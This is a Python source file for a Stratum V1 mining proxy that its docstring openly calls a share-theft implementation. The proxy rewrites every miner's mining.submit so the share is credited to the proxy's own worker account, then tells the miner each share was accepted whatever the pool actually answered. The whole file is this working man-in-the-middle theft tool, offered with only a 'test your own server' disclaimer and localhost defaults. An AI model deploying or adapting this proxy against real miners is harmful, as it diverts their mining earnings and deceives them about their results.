"""Stratum V1 Mining Proxy - Share Theft Implementation

This proxy intercepts mining.submit messages from miners, replaces the worker
credentials with its own, forwards to upstream, and lies to the miner about
acceptance.

For testing against your own stratum server implementation only.
"""

import argparse
import asyncio
import json
import signal
import random
import string
from datetime import datetime


class StratumStealProxy:
    def __init__(
        self,
        listen_host: str = "127.0.0.1",
        listen_port: int = 3334,
        upstream_host: str = "127.0.0.1",
        upstream_port: int = 3333,
        upstream_user: str = "proxy_worker",
        upstream_password: str = "x",
    ):
        self.listen_host = listen_host
        self.listen_port = listen_port
        self.upstream_host = upstream_host
        self.upstream_port = upstream_port
        self.upstream_user = upstream_user
        self.upstream_password = upstream_password

        self.server: asyncio.Server | None = None
        self.running = False

        self._miner_submit_id = 1
        self._upstream_submit_id = 1
        self._id_to_upstream: dict[int, int] = {}
        self._upstream_to_miner: dict[int, int] = {}
        self._miner_authorized = False
        self._upstream_authorized = False
        self._upstream_auth_id = None

    def _log(self, direction: str, message: str, data: bytes | None = None):
        timestamp = datetime.now().strftime("%H:%M:%S.%f")[:-3]
        prefix = f"[{timestamp}] [{direction}]"
        print(prefix, message)
        if data:
            print(prefix, data.decode("utf-8", errors="replace"))

    async def handle_client(
        self,
        client_reader: asyncio.StreamReader,
        client_writer: asyncio.StreamWriter,
    ):
        client_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=6))
        print(f"[PROXY] Client connected: {client_writer.get_extra_info('peername')}")

        upstream_reader = None
        upstream_writer = None

        try:
            upstream_reader, upstream_writer = await asyncio.open_connection(
                self.upstream_host,
                self.upstream_port,
            )
            print(f"[PROXY] Connected to upstream {self.upstream_host}:{self.upstream_port}")

            self._upstream_auth_id = random.randint(1000, 9999)
            auth_message = {
                "id": self._upstream_auth_id,
                "method": "mining.authorize",
                "params": [self.upstream_user, self.upstream_password],
            }
            auth_data = (json.dumps(auth_message) + "\n").encode("utf-8")
            upstream_writer.write(auth_data)
            await upstream_writer.drain()
            self._log("UPSTREAM", f"Sent authorize: {self.upstream_user}")

            async def forward_miner_to_pool():
                try:
                    buffer = b""
                    while self.running:
                        data = await asyncio.wait_for(client_reader.read(4096), timeout=30)
                        if not data:
                            break

                        buffer += data

                        while b"\n" in buffer:
                            line, buffer = buffer.split(b"\n", 1)
                            if not line.strip():
                                continue

                            try:
                                message = json.loads(line.decode("utf-8"))
                            except (json.JSONDecodeError, UnicodeDecodeError):
                                upstream_writer.write(line + b"\n")
                                await upstream_writer.drain()
                                continue

                            method = message.get("method")
                            msg_id = message.get("id")

                            if method == "mining.authorize":
                                self._miner_authorized = True
                                self._log(
                                    "MINER", f"Authorize request: {message.get('params', [])}"
                                )

                            elif method == "mining.submit":
                                original_worker = message.get("params", [""])[0]
                                original_id = message.get("id")

                                new_id = self._upstream_submit_id
                                self._upstream_submit_id += 1
                                self._id_to_upstream[original_id] = new_id
                                self._upstream_to_miner[new_id] = original_id

                                message["params"][0] = self.upstream_user
                                message["id"] = new_id

                                self._log(
                                    "MINER",
                                    f"Submit from worker '{original_worker}' -> changing to '{self.upstream_user}'",
                                )

                                line = (json.dumps(message) + "\n").encode("utf-8")

                            upstream_writer.write(line + b"\n")
                            await upstream_writer.drain()

                except asyncio.TimeoutError:
                    pass
                except Exception as e:
                    print(f"[PROXY] Error miner->pool: {e}")
                finally:
                    upstream_writer.close()
                    await upstream_writer.wait_closed()

            async def forward_pool_to_miner():
                try:
                    buffer = b""
                    while self.running:
                        data = await asyncio.wait_for(upstream_reader.read(4096), timeout=30)
                        if not data:
                            break

                        buffer += data

                        while b"\n" in buffer:
                            line, buffer = buffer.split(b"\n", 1)
                            if not line.strip():
                                continue

                            try:
                                message = json.loads(line.decode("utf-8"))
                            except (json.JSONDecodeError, UnicodeDecodeError):
                                client_writer.write(line + b"\n")
                                await client_writer.drain()
                                continue

                            upstream_id = message.get("id")

                            if upstream_id == self._upstream_auth_id:
                                if message.get("result"):
                                    self._upstream_authorized = True
                                    self._log("UPSTREAM", f"Authorized as {self.upstream_user}")
                                continue

                            if upstream_id in self._upstream_to_miner:
                                miner_id = self._upstream_to_miner.pop(upstream_id)
                                message["id"] = miner_id
                                message["result"] = True
                                self._log(
                                    "UPSTREAM",
                                    f"Submit result: upstream_id={upstream_id} -> lying to miner with id={miner_id}",
                                )
                                line = (json.dumps(message) + "\n").encode("utf-8")
                                client_writer.write(line + b"\n")
                                await client_writer.drain()
                            else:
                                self._log(
                                    "UPSTREAM", f"Forwarding notification/response: {message}"
                                )
                                client_writer.write(line + b"\n")
                                await client_writer.drain()

                except asyncio.TimeoutError:
                    pass
                except Exception as e:
                    print(f"[PROXY] Error pool->miner: {e}")
                finally:
                    client_writer.close()
                    await client_writer.wait_closed()

            await asyncio.gather(
                forward_miner_to_pool(),
                forward_pool_to_miner(),
            )

        except Exception as e:
            print(f"[PROXY] Client handler error: {e}")
        finally:
            if upstream_writer:
                upstream_writer.close()
                await upstream_writer.wait_closed()
            client_writer.close()
            await client_writer.wait_closed()
            print(f"[PROXY] Client disconnected: {client_id}")

    async def start(self):
        self.server = await asyncio.start_server(
            self.handle_client,
            self.listen_host,
            self.listen_port,
        )

        self.running = True
        addr = self.server.sockets[0].getsockname()
        print(f"[PROXY] Listening on {addr[0]}:{addr[1]}")
        print(f"[PROXY] Forwarding to {self.upstream_host}:{self.upstream_port}")
        print(f"[PROXY] Upstream credentials: {self.upstream_user}:{self.upstream_password}")

        async with self.server:
            await self.server.serve_forever()

    async def stop(self):
        self.running = False

        if self.server:
            self.server.close()
            await self.server.wait_closed()

        print("[PROXY] Stopped")


async def main():
    parser = argparse.ArgumentParser(description="Stratum Mining Proxy - Share Theft Testing Tool")
    parser.add_argument(
        "--listen",
        default="127.0.0.1:3334",
        help="Proxy listen address (default: 127.0.0.1:3334)",
    )
    parser.add_argument(
        "--upstream",
        default="127.0.0.1:3333",
        help="Upstream Stratum server (default: 127.0.0.1:3333)",
    )
    parser.add_argument(
        "--upstream-user",
        default="proxy_worker",
        help="Upstream worker name (default: proxy_worker)",
    )
    parser.add_argument(
        "--upstream-password",
        default="x",
        help="Upstream worker password (default: x)",
    )

    args = parser.parse_args()

    listen_host, listen_port = args.listen.rsplit(":", 1)
    listen_port = int(listen_port)

    upstream_host, upstream_port = args.upstream.rsplit(":", 1)
    upstream_port = int(upstream_port)

    proxy = StratumStealProxy(
        listen_host=listen_host,
        listen_port=listen_port,
        upstream_host=upstream_host,
        upstream_port=upstream_port,
        upstream_user=args.upstream_user,
        upstream_password=args.upstream_password,
    )

    loop = asyncio.get_running_loop()

    def signal_handler():
        print("\n[PROXY] Shutting down...")
        asyncio.create_task(proxy.stop())

    for sig in (signal.SIGINT, signal.SIGTERM):
        loop.add_signal_handler(sig, signal_handler)

    try:
        await proxy.start()
    except KeyboardInterrupt:
        pass
    finally:
        await proxy.stop()


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
